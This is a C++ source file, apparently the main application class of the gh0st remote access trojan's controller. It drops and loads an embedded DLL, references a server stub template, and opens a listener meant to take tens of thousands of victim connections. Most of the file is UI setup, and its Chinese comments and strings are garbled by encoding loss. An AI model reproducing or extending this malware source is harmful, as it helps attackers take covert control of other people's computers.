// gh0st.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "gh0st.h"

#include "MainFrm.h"
#include "gh0stDoc.h"
#include "gh0stView.h"
#include "Splash.h"
#include"CreditStatic.h"
// #include "MianZeShengMing.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


BOOL ReleaseGIF(LPSTR Path,LPCTSTR ResID,LPCTSTR ResDir)
{
	HRSRC m_Hsrc=FindResource(NULL,(LPCTSTR)ResID,(LPCTSTR)ResDir);
	
	if(m_Hsrc == NULL)
		return FALSE;
	
	HGLOBAL m_Hglobal = LoadResource(NULL,m_Hsrc);
	
	BYTE *LPData =(LPBYTE) LockResource(m_Hglobal);
	DWORD Size = SizeofResource(NULL,m_Hsrc);
	
	DeleteFile(Path);
	
	HANDLE hFile = CreateFile
		(
		Path, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	DWORD dwBytes=NULL;
	
	WriteFile(hFile,LPData,Size, &dwBytes, NULL);
	
	CloseHandle(hFile);
	
	FreeResource(m_Hglobal);
	
	return TRUE;
}

void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	char buff[1024];
	memset(buff, 0, sizeof(buff));
	wsprintf
		(buff, 
		"CRASH CODE:0x%.8x ADDR=0x%.8x FLAGS=0x%.8x PARAMS=0x%.8x\n"
		"eax=%.8x ebx=%.8x ecx=%.8x\nedx=%.8x esi=%.8x edi=%.8x\neip=%.8x esp=%.8x ebp=%.8x\n",
		ExceptionInfo->ExceptionRecord->ExceptionCode,
		ExceptionInfo->ExceptionRecord->ExceptionAddress,
		ExceptionInfo->ExceptionRecord->ExceptionFlags,
		ExceptionInfo->ExceptionRecord->NumberParameters,
		ExceptionInfo->ContextRecord->Eax,
		ExceptionInfo->ContextRecord->Ebx,
		ExceptionInfo->ContextRecord->Ecx,
		ExceptionInfo->ContextRecord->Edx,
		ExceptionInfo->ContextRecord->Esi,
		ExceptionInfo->ContextRecord->Edi,
		ExceptionInfo->ContextRecord->Eip,
		ExceptionInfo->ContextRecord->Esp,
		ExceptionInfo->ContextRecord->Ebp
		);
	
	MessageBox(NULL, buff, "ghost4.0 Exception", MB_OK);
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	dbg_dump(ExceptionInfo);
	// ���˳�
	return true;
	/*ExitProcess(0);*/
}
/////////////////////////////////////////////////////////////////////////////
// CGh0stApp

BEGIN_MESSAGE_MAP(CGh0stApp, CWinApp)
	//{{AFX_MSG_MAP(CGh0stApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stApp construction

BOOL CGh0stApp::bUsePlugin = FALSE;

/*
CString  szTips ="�ս��߸��������й����\r\n\r\n"
"...........ʹ�������˺ö��죬���᲻�����ǣ��Ұ����ǣ�����\r\n\r\n"
"���ڷ���̫������ʵ��û�а취��������ȥ�ˣ���ϣ���õ����ǵ�ԭ�£�\r\n\r\n"
"2.2���潫��Ϊ�������ɰ桢���������ơ����������ƣ�Ҳ���Ƕ����ǵĲ�����\r\n\r\n"
"�Ҳ���˵ɿ����Ļ����Ҹ�л���ǣ����ٴ��������ǵ�ԭ�£�\r\n\r\n"
"���Ѿ����ǵ��ж������ͻ������ٴ�ͻ����������������ҵ�Ǯ�����Ҹ���Ķ�����\r\n\r\n"
"��ô�һ᲻��ʱ��İ����������¼���DAT����ʱ���DAT���ص�ַ�����ҵ�QQǩ����\r\n\r\n"
"ϣ������Ŭ�������Եõ����ǵ�ԭ�£�\r\n\r\n"
"���������ף����ҡ�ƽƽ������˳˳������֪������Ҹ������ã�\r\n\r\n"
"���ס�����ĻԻ͡������������Ĵ�ڣ������������硢�������ڣ�\r\n\r\n"
"�һ��ס��ҵ����飬�һ�һֱΪ���ף����\r\n\r\n"
"�Ұ����ǡ���Ե�һ������ټ��ģ�  �����ˣ��ټ����ҵ��ֵ��ǣ� \r\n\r\n";*/

char CGh0stApp::szCurPath[]={NULL};

CGh0stApp::CGh0stApp()
{
//	MessageBox(NULL,szTips.GetBuffer(0),"�ս�����ʾ",MB_OK|MB_ICONINFORMATION);

	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
	// ��ʼ�������̵�ͼ���б�, Ϊ����ϵͳͼ���б���׼��
	typedef BOOL (WINAPI * pfn_FileIconInit) (BOOL fFullInit);
	pfn_FileIconInit FileIconInit = (pfn_FileIconInit) GetProcAddress(LoadLibrary("shell32.dll"), (LPCSTR)660);
	FileIconInit(TRUE);

	HANDLE	hFile = CreateFile("QQwry.dat", 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		m_bIsQQwryExist = true;
	}
	else
	{
		m_bIsQQwryExist = false;
	}
	CloseHandle(hFile);

	m_bIsDisablePopTips = m_IniFile.GetInt("Settings", "PopTips", false);
	m_pConnectView = NULL;
	m_bPalySound = m_IniFile.GetInt("Settings","Sound",false);

	ZeroMemory(szDllPath,MAX_PATH);

	GetCurrentDirectory(MAX_PATH,szDllPath);
	strcat(szDllPath,"\\meng.dll");
	ReleaseGIF(szDllPath,(LPCTSTR)IDR_BSS2,(LPCTSTR)"BSS");

	m_Hmodule = LoadLibrary(szDllPath);
	
	bUsePlugin = TRUE;//�����ж��û��Ƿ���Ȩ��ʹ�� ��Ϊtrue Ϊ��

	GetCurrentDirectory(MAX_PATH,szCurPath);
	strcat(szCurPath,"\\DAT\\Server.Dat");
}

DWORD CGh0stApp::GetRand()
{
	typedef DWORD (WINAPI *tGetRandNum)();
	tGetRandNum pGetRandNum = (tGetRandNum)GetProcAddress(m_Hmodule,"GetRandNum");

	if(pGetRandNum)
		return pGetRandNum();
}

void CGh0stApp::GetRandString(LPSTR szStr,DWORD len)
{
	typedef void (WINAPI *tGetRandstr)(LPSTR,DWORD);
	tGetRandstr pGetRandstr = (tGetRandstr)GetProcAddress(m_Hmodule,"GetRand");

	if(pGetRandstr)
		pGetRandstr(szStr,len);

}

/////////////////////////////////////////////////////////////////////////////
// The one and only CGh0stApp object

CGh0stApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CGh0stApp initialization

BOOL CGh0stApp::InitInstance()
{
	// CG: The following block was added by the Splash Screen component.
// 	CMianZeShengMing m_Dlg;
// 	m_Dlg.DoModal();

	CoInitialize(NULL);

	{

	CCommandLineInfo cmdInfo;

	ParseCommandLine(cmdInfo);

	if(!((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "CloseAllAnimate",false))
		CSplashWnd::EnableSplashScreen(cmdInfo.m_bShowSplash);
	}	
	
	SetUnhandledExceptionFilter(bad_exception);

	AfxEnableControlContainer();

	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif
	//��Ƥ��
    CString strSkinFile = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Ƥ��", "·��", "");
	SkinH_AttachEx(_T(strSkinFile),NULL);
	SkinH_SetMenuAlpha(170);
	SkinH_AdjustHSV(0,-100,0);
	if (((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Ƥ��", "·��", "") == "��")
	{
		SkinH_Detach();
	}
	//����ɫ��
	Color1  = 	((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Ƥ��", "ɫ��");
	Color2  = 	((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Ƥ��", "����");
	Color3  = 	((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Ƥ��", "����");
	// Change the registry key under which our settings are stored.
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization.
//	SetRegistryKey(_T("Local AppWizard-Generated Applications"));

//	LoadStdProfileSettings(0);  // Load standard INI file options (including MRU)

	// Register the application's document templates.  Document templates
	//  serve as the connection between documents, frame windows and views.

	CSingleDocTemplate* pDocTemplate;
	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(CGh0stDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(CGh0stView));
	AddDocTemplate(pDocTemplate);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// The one and only window has been initialized, so show and update it.
	m_pMainWnd->ShowWindow(SW_SHOW);
	m_pMainWnd->UpdateWindow();

	// ����IOCP������
	int	nPort = m_IniFile.GetInt("Settings", "ListenPort");

	int	nMaxConnection = m_IniFile.GetInt("Settings", "MaxConnection");
	if (nPort == 0)
		nPort = 80;
/*
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	
	if (m_IniFile.GetInt("Settings", "MaxConnectionAuto"))
		nMaxConnection = 80000;
*/

	nMaxConnection = 60000;

	((CMainFrame*) m_pMainWnd)->Activate(nPort, nMaxConnection);
    ((CMainFrame*) m_pMainWnd)->StartWork();
	return TRUE;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();
	CHAR pIntro[2000];
// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	CCreditStatic	m_Static;
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	public:
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnShowWindow(BOOL bShow, UINT nStatus);
	afx_msg void OnClose();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
	ZeroMemory(pIntro,sizeof(pIntro));
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	DDX_Control(pDX, IDC_STATIC_ABOUT, m_Static);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
	ON_WM_SHOWWINDOW()
	ON_WM_CLOSE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CGh0stApp::OnAppAbout()
{
	CAboutDlg aboutDlg;

	strcpy(aboutDlg.pIntro,pIntro);

	aboutDlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stApp message handlers


BOOL CGh0stApp::PreTranslateMessage(MSG* pMsg)
{
	// CG: The following lines were added by the Splash Screen component.
	if (CSplashWnd::PreTranslateAppMessage(pMsg))
		return TRUE;

	return CWinApp::PreTranslateMessage(pMsg);
}

BOOL CAboutDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	m_Static.SetCredits(pIntro);//��������
	m_Static.SetSpeed(2);
	m_Static.StartScrolling();//��ʼ����

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CAboutDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
	
	// TODO: Add your message handler code here
	AnimateWindow(m_hWnd,300,AW_BLEND);
}

void CAboutDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	CDialog::OnClose();
}


DWORD ResolvDNS(LPSTR szTarget)
{
	if(szTarget == NULL)
		return FALSE;
	
	DWORD Result = inet_addr(szTarget);
	if(Result!=INADDR_NONE)
		return Result;
	
	hostent Host={0};
	memcpy(&Host,gethostbyname(szTarget),sizeof(hostent));
	
	memcpy(&Result,Host.h_addr,sizeof(DWORD));
	
	return Result;
}

int CGh0stApp::ExitInstance() 
{
	// TODO: Add your specialized code here and/or call the base class
	FreeLibrary(m_Hmodule);

	return CWinApp::ExitInstance();
}
